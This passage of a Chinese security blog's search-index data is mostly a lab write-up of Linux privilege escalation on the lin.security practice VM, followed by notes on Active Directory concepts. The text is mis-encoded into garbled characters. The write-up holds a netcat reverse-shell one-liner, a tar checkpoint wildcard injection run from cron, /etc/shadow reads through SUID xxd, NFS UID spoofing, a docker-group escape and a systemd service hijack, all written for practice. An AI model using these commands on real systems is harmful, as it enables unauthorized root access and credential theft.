æƒé™ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿå·§å¦™çš„åˆ©ç”¨æ‰§è¡Œè¿™äº›å‘½ä»¤ã€‚é™äºç¯‡å¹…ï¼Œå°±ä¸ç»™å‡ºæ‰€æœ‰å‘½ä»¤çš„åˆ©ç”¨æ–¹å¼äº†ï¼Œæˆ‘ä»¬å¯ä»¥å‚è€ƒèµ„æº https://gtfobins.github.io/ ï¼Œé‡Œé¢æ¶µç›–äº†è®¸å¤šå¯ä»¥è¢«åˆ©ç”¨çš„å‘½ä»¤ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:2:4","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"3 /etc/passwdçš„å“ˆå¸Œ linux çš„ç”¨æˆ·å¯†ç å“ˆå¸Œå­˜å‚¨åœ¨ /etc/shadow è¿™ä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶æ™®é€šç”¨æˆ·æ˜¯æ— æ³•æŸ¥çœ‹çš„ã€‚è€Œæ™®é€šç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹åˆ°çš„åˆ™æ˜¯ /etc/passwd è¿™ä¸ªæ–‡ä»¶ã€‚å¦‚æœæˆ‘ä»¬æŸ¥çœ‹ /etc/passwd é€šå¸¸ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š root:x:0:0:root:/root:/bin/bash å¦‚æœæœ‰ä¸€ä¸ªè´¦æˆ·çš„ç¬¬äºŒåˆ—æ˜¯å¯†ç å“ˆå¸Œï¼Œå¦‚æœè¯¥åˆ—ä¸º x åˆ™ä»£è¡¨å¯†ç å“ˆå¸Œå­˜å‚¨åœ¨ /etc/shadow æ–‡ä»¶ä¸Šã€‚è€Œåœ¨ lin.security è™šæ‹Ÿæœºä¸Šå¯ä»¥çœ‹åˆ°åƒ insecurity è¿™ä¹ˆä¸€ä¸ªè´¦æˆ·ï¼Œè¿™ä¸ªè´¦å·çš„ uid å’Œ gid éƒ½ä¸º 0ã€‚ç”¨ç±»ä¼¼ Johnny æˆ–è€… hash-identifier ä¼šè¢«è¡¨ç¤ºæˆ descryptï¼Œè¿›è€Œå¯ä»¥è¢«ç ´è§£å‡ºæ¥ã€‚ é€šè¿‡æŸ¥è¯¢ï¼Œå¯å¾—å¯†ç ä¸ºP@ssw0rd11ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:3:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"4 åˆ©ç”¨å®šæ—¶ä»»åŠ¡cronä»¥åŠé€šé…ç¬¦ æ¯éš”1åˆ†é’Ÿå®šæœŸæ‰§è¡Œ /etc/cron.daily/backup è¿™ä¸ªæ–‡ä»¶ã€‚ è¿™é‡Œæ¶‰åŠåˆ°äº†åˆ©ç”¨é€šé…ç¬¦è¿›è¡Œ Linux æœ¬åœ°ææƒï¼Œæˆ‘ä»¬éœ€è¦å¦å¼€ä¸€ä¸ª bob çš„ ssh ä¼šè¯ã€‚ ä½¿ç”¨ msfvenom ç”Ÿæˆ nc åå¼¹ä¸€å¥è¯ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š -pï¼špayload Rï¼šRAW åŸå§‹æ•°æ® root@kali:~# msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder or badchars specified, outputting raw payload Payload size: 91 bytes mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0\u003c/tmp/kuhdq | /bin/sh \u003e/tmp/kuhdq 2\u003e\u00261; rm /tmp/kuhdq ç„¶ååˆ†åˆ«æ‰§è¡Œï¼š bob@linsecurity:~$ echo \"mkfifo /tmp/kuhdq; nc 127.0.0.1 8888 0\u003c/tmp/kuhdq | /bin/sh \u003e/tmp/kuhdq 2\u003e\u00261; rm /tmp/kuhdq\" \u003e shell.sh \u0026\u0026 chmod +x shell.sh bob@linsecurity:~$ echo \"\" \u003e \"--checkpoint-action=exec=sh shell.sh\" bob@linsecurity:~$ echo \"\" \u003e --checkpoint=1 æˆ‘ä»¬åœ¨å¦å¤–ä¸€ä¸ªä¼šè¯ç»ˆç«¯å¼€å¯ nc ç›‘å¬ï¼š nc -lvnp 8888 â€“checkpoint[=NUMBER] æ˜¾ç¤ºæ¯ä¸ªNumbersè®°å½•çš„è¿›åº¦æ¶ˆæ¯ï¼ˆé»˜è®¤å€¼ä¸º10ï¼‰ â€“checkpoint-action=ACTION åœ¨æ¯ä¸ªcheckpointï¼ˆæ£€æŸ¥ç‚¹ï¼‰ä¸Šæ‰§è¡ŒACTION è¿™é‡Œçš„ â€“checkpoint-action é€‰é¡¹ï¼Œç”¨äºæŒ‡å®šåˆ°è¾¾æ£€æŸ¥ç‚¹æ—¶å°†è¦æ‰§è¡Œçš„ç¨‹åºï¼Œè¿™å°†å…è®¸æˆ‘ä»¬è¿è¡Œä¸€ä¸ªä»»æ„çš„å‘½ä»¤ã€‚å› æ­¤ï¼Œé€‰é¡¹ â€“checkpoint=1 å’Œ â€“checkpoint-action=exec=sh shell.sh ä½œä¸ºå‘½ä»¤è¡Œé€‰é¡¹äº¤ç»™äº† tar ç¨‹åºã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:4:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"5 åˆ©ç”¨éšè—æ–‡ä»¶ æœ‰æ—¶å€™éšè—æ–‡ä»¶ä¼šå­˜æ”¾ä¸€äº›é‡è¦çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æˆ‘ä»¬æœç´¢ home ç›®å½•ä¸‹çš„æ‰€æœ‰éšè—æ–‡ä»¶ï¼Œå¹¶ç”¨ ls -al æ˜¾ç¤ºå‡ºæ¥ã€‚ find / -name \".*\" -type f -path \"/home/*\" -exec ls -al {} \\; 2\u003e/dev/null å‘ç°äº† susan è¿™ä¸ªç”¨æˆ·æœ‰ä¸€ä¸ª .secret çš„éšè—æ–‡ä»¶ï¼Œå‘ç°é‡Œé¢å­˜æ”¾ susan è¿™ä¸ªç”¨æˆ·çš„ç™»é™†å¯†ç ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:5:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"6 åˆ©ç”¨ SUID ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"6.1 æ–¹æ¡ˆä¸€ SUID è¿™ä¸ªæ˜¯ uid +s çš„ç»„åˆï¼Œs æŒ‡çš„æ˜¯ç‰¹æ®Šæƒé™ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç”¨æˆ·çš„æƒé™æ˜¯ 3 ä½ï¼Œæ¯”å¦‚ 0755 è¿™æ ·çš„ï¼Œé»˜è®¤ç‰¹æ®Šæƒé™æ²¡æœ‰é…ç½®ï¼Œä½†æ˜¯å¦‚æœè¶…çº§ç®¡ç†å‘˜å¸Œæœ›ç”¨æˆ·åœ¨æ‰§è¡Œä¸€äº›ç‰¹æ®Šæƒé™æ–‡ä»¶æ—¶ï¼Œæ‹¥æœ‰ root çš„æƒé™ï¼Œå°±ä¼šé…ç½®ç‰¹æ®Šæƒé™ã€‚ æ¯”å¦‚è¯´ passwd è¿™ä¸ªå‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤ä¼šä¿®æ”¹ /etc/shadow æ–‡ä»¶ï¼Œè€Œ /etc/shadow åªæœ‰ root æ‰èƒ½ä¿®æ”¹ï¼Œæœ¬æ¥ passwd è¿™ä¸ªå‘½ä»¤åº”è¯¥ä¹Ÿåªèƒ½ root æ‰èƒ½æ‰§è¡Œçš„ã€‚ä½†æ˜¯ç³»ç»Ÿä¸ºäº†è®©æ™®é€šç”¨æˆ·èƒ½å¤Ÿä¿®æ”¹è‡ªå·±çš„å¯†ç ï¼Œå¯¹ passwd è¿™ä¸ªå‘½ä»¤èµ‹äºˆäº†ç‰¹æ®Šæƒé™å¹¶æ·»åŠ äº†åªèƒ½ä¿®æ”¹è‡ªå·±å¯†ç çš„é™åˆ¶ã€‚ ç”±äº passwd è¿™ä¸ªå‘½ä»¤æ˜¯åšè¿‡é™åˆ¶çš„ï¼Œæ‰€ä»¥èµ‹äºˆç‰¹æ®Šæƒé™æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœç³»ç»Ÿè¶…çº§ç”¨æˆ·ç‰¹æ®Šæƒé™ä¹±ç”¨ï¼Œå°±ä¼šå¯¼è‡´ææƒçš„é—®é¢˜ã€‚ é‚£æˆ‘ä»¬æ€ä¹ˆå»å¯»æ‰¾ç³»ç»Ÿæ˜¯å¦å­˜åœ¨ç‰¹æ®Šæƒé™é…ç½®çš„æ–‡ä»¶å‘¢ï¼Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¿«é€ŸæŸ¥æ‰¾æ‰€æœ‰ SUID æ–‡ä»¶ï¼š find / -perm -4000 -type f -exec ls -la {} 2\u003e/dev/null \\; æˆ‘ä»¬å‘ç°äº†å¦‚ä¸‹ä¸€ä¸ªæ–‡ä»¶ xxdã€‚è¿™ä¸ªæ–‡ä»¶å…¶å®æ˜¯å‘½ä»¤æ–‡ä»¶ï¼Œxxd çš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªæ–‡ä»¶ä»¥ 16 è¿›åˆ¶çš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ã€‚ä»–è¢«é…ç½®äº†ç‰¹æ®Šæƒé™ï¼Œå¹¶ä¸”ç”¨æˆ·ç»„ä¸º itservices æ˜¯æ‹¥æœ‰æ‰§è¡Œæƒé™ x çš„ã€‚ è¿™å°±å¾ˆå±é™©äº†ï¼Œä¸€æ—¦ suid å’Œæ‰§è¡Œæƒé™åœ¨ä¸€èµ·å°±å¯èƒ½å¯¼è‡´æƒé™æå‡ã€‚ æˆ‘ä»¬é€šè¿‡å‘½ä»¤æŸ¥çœ‹å‘ç° susan è¿™ä¸ªç”¨æˆ·å±äº itservices è¿™ä¸ªç”¨æˆ·ç»„ã€‚ æˆ‘ä»¬ç”¨å®ƒæ¥æŸ¥çœ‹ /etc/shadow è¿™ä¸ªæ–‡ä»¶ï¼Œæ›´å¤šåˆ©ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒhttps://gtfobins.github.io/gtfobins/xxd/. xxd \"/etc/shadow\" | xxd -r æ³¨ï¼š find /dir -exec \"command\" åŒæ ·çš„ææƒæ•ˆæœã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:1","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"6.2 æ–¹æ¡ˆäºŒ é™¤äº†ä¸Šè¿°çš„æ–‡ä»¶å¤–ï¼Œè¿˜å‘ç°äº†ä¸€ä¸ª other è§’è‰²æ‹¥æœ‰æ‰§è¡Œæƒé™çš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸é™ç”¨æˆ·ï¼Œæ‰€ä»¥å±å®³æ›´å¤§ã€‚ å‚è€ƒhttps://gtfobins.github.io/gtfobins/taskset/#suid-enabledï¼Œå‘ç°è¯¥æ–‡ä»¶å¯ä»¥ç›´æ¥è·å–shellã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:6:2","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"7 NFS ææƒ nmap æ‰«æç«¯å£ï¼ŒæŸ¥çœ‹å¼€æ”¾æœåŠ¡ï¼šnmap -sS -Pn -p- -A IP çœ‹åˆ°å¼€æ”¾ 2049 ç«¯å£ï¼ŒNFS æœåŠ¡ã€‚ä¹Ÿå¯ä»¥é€šè¿‡ rpcinfo -p IP å‘½ä»¤æ¥ç¡®å®šä¸»æœºä¸Šæ˜¯å¦è¿è¡Œæˆ–æŒ‚è½½äº† NFS æœåŠ¡ã€‚ å½“ showmount å‘½ä»¤ä¸ä»¥ä¸‹å‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¯ä»¥è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œä¾‹å¦‚ï¼š æŒ‚è½½ç‚¹ è¿æ¥çš„ä¸»æœº ç›®å½• showmount IP // è¿æ¥çš„ä¸»æœº showmount -d IP // ç›®å½• showmount -a IP // æŒ‚è½½ç‚¹ åœ¨ msf ä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ¨¡å—ï¼Œå¯ä»¥ç”¨æ¥åˆ—å‡ºå¯¼å‡ºæ–‡ä»¶å¤¹ï¼šauxiliary/scanner/nfs/nfsmountã€‚ è´¦å· peter çš„å®¶ç›®å½•å¯ä»¥è¢«æŒ‚è½½ï¼š mkdir /mnt/peter mount 192.168.68.99:/home/peter /mnt/peter/ æŒ‚è½½å¥½çš„ peter çš„å®¶ç›®å½•ï¼Œæ˜¾ç¤ºçš„æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„åˆ†åˆ«ä¸º 1001 å’Œ 1005 å°è¯•åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶ï¼Œå‘ç°æƒé™ä¸å¤Ÿã€‚ å³ä½¿æˆ‘ä»¬åœ¨ kali æ”»å‡»æœºä¸Šæ˜¯ root ç”¨æˆ·ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯æ²¡æœ‰å†™å…¥æƒé™ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹å®¢æˆ·ç«¯çš„ root èº«ä»½ä¼šè¢«ä¸»åŠ¨å‹ç¼©æˆåŒ¿åè€…ã€‚ å¯ä»¥ä¼ªé€ æ–‡ä»¶æ‰€æœ‰è€…çš„ UID å’Œ GID æ¥æ¬ºéª— NFS æœåŠ¡å™¨ï¼Œåˆ›å»ºä¸€ä¸ª gid ä¸º 1005 çš„ç”¨æˆ·ç»„ï¼Œæ¥ç€åˆ›å»º peter è¿™ä¸ªè´¦æˆ· uid æŒ‡å®šä¸º 1001ï¼Œgid æŒ‡å®šä¸º 1005ã€‚ åˆ‡æ¢å®¢æˆ·ç«¯ç”¨æˆ·ä¸º peterï¼ŒæœåŠ¡ç«¯ä¹Ÿè®¤ä¸ºæ˜¯å­˜åœ¨çš„ç”¨æˆ· peter å¯ä»¥ç›´æ¥å‘ .ssh æ–‡ä»¶å¤¹ä¸‹å†™å…¥å…¬é’¥ï¼Œç„¶åç›´æ¥ä½¿ç”¨ ssh ç™»å½•ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:7:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"8 åˆ©ç”¨ docker ç»„ææƒ å¯ä»¥å‘ç° peter å±äº docker ç»„ï¼š å¯ä»¥æ ¹æ®https://fosterelli.co/privilege-escalation-via-docker.html docker run -v /:/hostOS -i -t chrisfosterelli/rootplease ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:8:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"9 systems é…ç½®ä¸å½“ææƒ å†å²ä¸Šï¼ŒLinux çš„å¯åŠ¨ä¸€ç›´é‡‡ç”¨ init è¿›ç¨‹ï¼š sudo /etc/init.d/sshd start # æˆ–è€… service sshd start è¿™ç§æ–¹æ³•æœ‰ä¸¤ä¸ªç¼ºç‚¹ï¼š ä¸€æ˜¯å¯åŠ¨æ—¶é—´é•¿ã€‚init è¿›ç¨‹æ˜¯ä¸²è¡Œå¯åŠ¨ï¼Œåªæœ‰å‰ä¸€ä¸ªè¿›ç¨‹å¯åŠ¨å®Œï¼Œæ‰ä¼šå¯åŠ¨ä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚ äºŒæ˜¯å¯åŠ¨è„šæœ¬å¤æ‚ã€‚init è¿›ç¨‹åªæ˜¯æ‰§è¡Œå¯åŠ¨è„šæœ¬ï¼Œä¸ç®¡å…¶ä»–äº‹æƒ…ã€‚è„šæœ¬éœ€è¦è‡ªå·±å¤„ç†å„ç§æƒ…å†µï¼Œè¿™å¾€å¾€ä½¿å¾—è„šæœ¬å˜å¾—å¾ˆé•¿ã€‚ Systemd å°±æ˜¯ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜è€Œè¯ç”Ÿçš„ã€‚å®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯ï¼Œä¸ºç³»ç»Ÿçš„å¯åŠ¨å’Œç®¡ç†æä¾›ä¸€å¥—å®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚ ä½¿ç”¨äº† Systemdï¼Œå°±ä¸éœ€è¦å†ç”¨ init äº†ã€‚Systemd å–ä»£äº† initdï¼Œæˆä¸ºç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ˆPID ç­‰äº 1ï¼‰ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æ˜¯å®ƒçš„å­è¿›ç¨‹ã€‚ Systemd å¹¶ä¸æ˜¯ä¸€ä¸ªå‘½ä»¤ï¼Œè€Œæ˜¯ä¸€ç»„å‘½ä»¤ï¼Œæ¶‰åŠåˆ°ç³»ç»Ÿç®¡ç†çš„æ–¹æ–¹é¢é¢ã€‚ systemctl æ˜¯ Systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿã€‚ # é‡å¯ç³»ç»Ÿ sudo systemctl reboot æŸ¥çœ‹ peter ç”¨æˆ·çš„ systemd é…ç½®ï¼Œå‘ç° peter è¿™ä¸ªç”¨æˆ·æ‹¥æœ‰ debug.service æ–‡ä»¶ï¼Œå¹¶ä¸”å®ƒå¯¹è¿™ä¸ªæ–‡ä»¶æ‹¥æœ‰è¯»å’Œå†™çš„æƒé™ã€‚ å¦‚æœæœåŠ¡å™¨å­˜åœ¨ç¼ºé™·ï¼Œå¯ä»¥è¢«è¦†ç›–æˆ–è€…ä¿®æ”¹æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹ä½æƒé™ç”¨æˆ·æœ‰æƒè®¿é—®çš„ .service æ–‡ä»¶å¹¶æ›´æ”¹ run() å‘½ä»¤æ¥å°†å…¶è½¬æ¢ä¸ºä»£ç æ‰§è¡Œã€‚é‡æ–°å¯åŠ¨æœåŠ¡æ—¶ï¼Œå°†è¿è¡Œæ”»å‡»è€…çš„å‘½ä»¤ã€‚ æŸ¥çœ‹ .service æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ ExecStart æ–‡ä»¶ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ä¿®æ”¹ ExecStop å’Œ ExecReload æ¥åœ¨åœæ­¢å’Œé‡å¯æœåŠ¡æ—¶æ‰§è¡Œå‘½ä»¤ã€‚ æŸ¥çœ‹è¯¥ .service æ–‡ä»¶ï¼š ExecStart ä¸º /root/debugï¼Œè¿™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æœåŠ¡å¹¶ä¸”è¯¥æœåŠ¡ä»¥ root èº«ä»½è¿è¡Œã€‚ æ¥ä¸‹æ¥ä¸ºäº†åˆ©ç”¨ï¼Œä½¿ç”¨ä¸€ä¸ªç±»ä¼¼ ssh å¯ä»¥ sudo æ‰§è¡Œçš„æ–¹æ³•ã€‚ è®© root èº«ä»½æ¥åˆ›å»ºä¸€ä¸ª systemdexpl.sh è„šæœ¬ï¼Œå°† /bin/bash æ–‡ä»¶å¤åˆ¶åˆ° systemdbash å¹¶è®¾ç½®ä¸€ä¸ª SUID ä½å¹¶ä¸”èµ‹äºˆæ‰§è¡Œæƒé™ã€‚ echo -e '#!/bin/bash \\ncp /bin/bash /home/peter/systemdbash \\nchmod 6755 /home/peter/systemdbash' \u003e /home/peter/systemdexpl.sh \u0026\u0026 chmod +x systemdexpl.sh ä¿®æ”¹ debug.service æ–‡ä»¶æ¥è°ƒç”¨æˆ‘ä»¬çš„è„šæœ¬ï¼ˆroot è°ƒç”¨ debug.serviceï¼Œè€Œ debug.service åˆè°ƒç”¨æˆ‘ä»¬çš„ systemdexpl.sh è„šæœ¬ï¼‰ä¿®æ”¹ ExecStart ä¸ºå½“å‰è„šæœ¬ã€‚ ","date":"2019-10-31","objectID":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/:9:0","tags":["ææƒ","ææƒé¶åœº"],"title":"in.security ææƒé¶åœº","uri":"/2019/10/lin.security%E6%8F%90%E6%9D%83%E9%9D%B6%E5%9C%BA/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"AD æ´»åŠ¨ç›®å½•ç®¡ç†åŠç›¸å…³æ¦‚å¿µ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"AD æ´»åŠ¨ç›®å½•ç®¡ç† ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå’Œæ´»åŠ¨ç›®å½•çš„æ¦‚å¿µ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸå’Œæ´»åŠ¨ç›®å½•çš„ä»·å€¼ å¼ºåˆ¶ç»ˆç«¯è®¡ç®—æœºåŠç”¨æˆ·çš„å®‰å…¨ç­–ç•¥åŠæ¡Œé¢/åº”ç”¨ç¯å¢ƒ,å¹¶å¯å®ç°æ‰¹é‡å’Œè‡ªåŠ¨éƒ¨ç½²ï¼Œå‡è½» IT äººå‘˜æ—¥å¸¸çš„ç®¡ç†éš¾åº¦å’Œå·¥ä½œå¼ºåº¦ åŸŸä¸­çš„å„ç±»æœåŠ¡å’Œèµ„æº(æ–‡ä»¶å’Œæ‰“å°å…±äº«ç­‰)çš„è®¿é—®æ§åˆ¶å¯ä»¥çµæ´»çš„ä¸ä¼ä¸šçš„å±‚æ¬¡åŒ–ç»„ç»‡æ¶æ„ç›¸ç»“åˆï¼Œæ»¡è¶³å¤æ‚çš„æƒé™åˆ†é…ç­‰ç®¡ç†éœ€æ±‚ ç»Ÿä¸€çš„èº«ä»½éªŒè¯æ‰‹æ®µï¼Œå¯ä¸å¤šç§ Windows åº”ç”¨æœåŠ¡(å¦‚Exchange, Sharepointç­‰)åŠç¬¬ä¸‰æ–¹è½¯ä»¶é›†æˆï¼Œå®ç°å•ç‚¹ç™»å½•ï¼Œæ”¹å–„ç”¨æˆ·åœ¨å¤šä¸šåŠ¡ä¸­åˆ‡æ¢ä¸­çš„æ“ä½œä½“éªŒ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸä¸­çš„è§’è‰² DC-åŸŸæ§åˆ¶å™¨ æˆå‘˜æœåŠ¡å™¨ ç»ˆç«¯è®¡ç®—æœº ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸæ§åˆ¶å™¨ä¸­çš„ AD æ•°æ®åº“æ–‡ä»¶ AD æ•°æ®åº“æ–‡ä»¶é»˜è®¤ä¿å­˜åœ¨ C:\\Windows\\NTDS ç›®å½• AD æ•°æ®åº“ç»´æŠ¤è¿‡ç¨‹ä¸­å¿…è¦æ—¶å¯è¿›è¡Œäº”ç¦å¯åœã€æ–‡ä»¶å¤¹é‡å®šå‘ã€è„±æœºæ•´ç†ã€å¤‡ä»½åŠæ¢å¤ç­‰æ“ä½œ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸæ§åˆ¶å™¨ä¹‹é—´çš„ AD æ•°æ®åº“åŒæ­¥ AD æ•°æ®åº“ä¼šå®šæ—¶æ´»åœ¨å‘ç”Ÿæ”¹å˜æ—¶è‡ªåŠ¨åœ¨ DC ä¹‹é—´ç›¸äº’åŒæ­¥å¤åˆ¶ï¼ŒåŒæ­¥å¤åˆ¶çš„é¢‘ç‡å’Œæ—¶é—´çª—å£å¯ä»¥é…ç½®å’Œå®šä¹‰ ","date":"2019-10-09","objectID":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"AD æ´»åŠ¨ç›®å½•ç®¡ç†","uri":"/2019/10/ad%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E7%AE%A1%E7%90%86/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç‰¹æ®Šç±»å‹çš„åŸŸæ§åˆ¶å™¨ RODC RODC ä¿å­˜åŸŸæ§åˆ¶å™¨ä¸­ AD æ•°æ®åº“çš„åªè¯»å‰¯æœ¬ ä¸å…è®¸å† RODC æœ¬åœ°å¯¹æ•°æ®åº“ä½œå‡ºæ›´æ”¹æ“ä½œ RODC é€‚åˆéƒ¨ç½²åœ¨æ²¡æœ‰ç®¡ç†éœ€æ±‚çš„è¿œç¨‹åˆ†æ”¯æœºæ„ å…¨å±€ç¼–å½•æœåŠ¡å™¨ GC GC æ˜¯ä¸€ç§ç‰¹æ®Šçš„åŸŸæ§åˆ¶å™¨ï¼Œä¸€ä¸ªåŸŸè‡³å°‘éƒ¨ç½²ä¸€å° GC 